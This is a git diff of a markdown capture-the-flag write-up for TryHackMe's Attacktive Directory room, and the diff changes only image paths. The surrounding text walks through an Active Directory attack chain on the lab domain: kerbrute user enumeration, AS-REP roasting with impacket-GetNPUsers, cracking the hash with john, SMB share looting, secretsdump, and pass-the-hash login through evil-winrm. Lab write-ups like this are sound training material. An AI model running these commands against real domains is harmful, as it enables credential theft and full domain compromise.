@@ -42,7 +42,7 @@ The scan revealed two open ports:
 - ** 445 ** (microsoft-ds) - smb
 - and many more.. here i listed what are the most important for this room. 
 
-![nmap](/assets/images/writeups/attacktive_directory/nmap-scan.png)
+![nmap](/assets/images/writeups/thm/attacktive_directory/nmap-scan.png)
 
 ---
 
@@ -72,13 +72,13 @@ after enumeration there were the strongest clue that target was the "Domain Cont
  - The krbtgt account 
    S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
    
-   ![enum4linux](/assets/images/writeups/attacktive_directory/enum4linux-1.png)
+   ![enum4linux](/assets/images/writeups/thm/attacktive_directory/enum4linux-1.png)
 
  indicator2: 
  - Domain Controllers group
    THM-AD\Domain Controllers (Domain Group)
    
-    ![enum4linux](/assets/images/writeups/attacktive_directory/enum4linux-3.png)
+    ![enum4linux](/assets/images/writeups/thm/attacktive_directory/enum4linux-3.png)
 
 ---
 
@@ -104,7 +104,7 @@ here, i downloaded modified userlist and passwordlist, ie.
 ```bash 	
         kerbrute userenum -d spookysec.local --dc <target-ip>  userlist.txt -o users.txt
 ```
-   ![Username & Password Enumeration](/assets/images/writeups/attacktive_directory/user-password-enum-1.png)
+   ![Username & Password Enumeration](/assets/images/writeups/thm/attacktive_directory/user-password-enum-1.png)
 	  
    sort username
    
@@ -112,7 +112,7 @@ here, i downloaded modified userlist and passwordlist, ie.
 	grep "VALID USERNAME" users.txt | awk '{split($NF,a,"@"); print a[1]}'
 ```
 
-  ![Username & Password Enumeration](/assets/images/writeups/attacktive_directory/user-password-enum-2.png)
+  ![Username & Password Enumeration](/assets/images/writeups/thm/attacktive_directory/user-password-enum-2.png)
 
 ---
 
@@ -121,7 +121,7 @@ here, i downloaded modified userlist and passwordlist, ie.
 ```bash
 impacket-GetNPUsers spookysec.local/ -usersfile usernamewithdomain.txt -request
 ```
-  ![ASREPRoasting](/assets/images/writeups/attacktive_directory/user-password-enum-3.png)
+  ![ASREPRoasting](/assets/images/writeups/thm/attacktive_directory/user-password-enum-3.png)
   
 i found TGT hash of one the user and save it as hash.txt, by observing on hashcat.net official site. i came to figure out that, the hash-mode was 18200 and hash-name = Kerberos 5 AS-REP etype 23
 
@@ -133,7 +133,7 @@ here i choose john to crack the hash and decoded password to plain text
 ```bash
 john --wordlist=passwordlist.txt hash.txt  
 ```
- ![Crack hash](/assets/images/writeups/attacktive_directory/user-password-enum-4.png)
+ ![Crack hash](/assets/images/writeups/thm/attacktive_directory/user-password-enum-4.png)
  
 ---
 
@@ -143,7 +143,7 @@ With a user's account credentials i now have significantly more access within th
 ```bash 
 smbclient -L '<target-ip>' -U <user-name>
 ```
- ![Enumerate shares](/assets/images/writeups/attacktive_directory/user-password-enum5.png)
+ ![Enumerate shares](/assets/images/writeups/thm/attacktive_directory/user-password-enum5.png)
  
 finally, i grabbed the administrator credentials.
 
@@ -151,7 +151,7 @@ finally, i grabbed the administrator credentials.
 smbclient '//<target-ip>/<service-name>' -U <user-name>
 cat <credentials-name> | base64 -d
 ```
- ![Enumerate shares](/assets/images/writeups/attacktive_directory/user-password-enum-6.png)
+ ![Enumerate shares](/assets/images/writeups/thm/attacktive_directory/user-password-enum-6.png)
  
 ---
 
@@ -162,14 +162,14 @@ impacket-secretsdump spookysec.local/<admin-username>:<admin-password>@<target-i
 	
 evil-winrm -i <target-ip> -u administrator -H <ntlm-hash>
 ```
- ![Elevating](/assets/images/writeups/attacktive_directory/user-password-enum-7.png)
+ ![Elevating](/assets/images/writeups/thm/attacktive_directory/user-password-enum-7.png)
  
 after gaining access to admin. all three flags were captured
 
- ![dumping](/assets/images/writeups/attacktive_directory/user-password-enum-8.png)
+ ![dumping](/assets/images/writeups/thm/attacktive_directory/user-password-enum-8.png)
 
 Each steps were a great exercise in real-world exploitation chains.
 
-🖼️ **all summary screenshot:** ![all summary](assets/images/writeups/attacktive_directory/all_summary.png)
+🖼️ **all summary screenshot:** ![all summary](assets/images/writeups/thm/attacktive_directory/all_summary.png)
 
 *Thanks for reading*
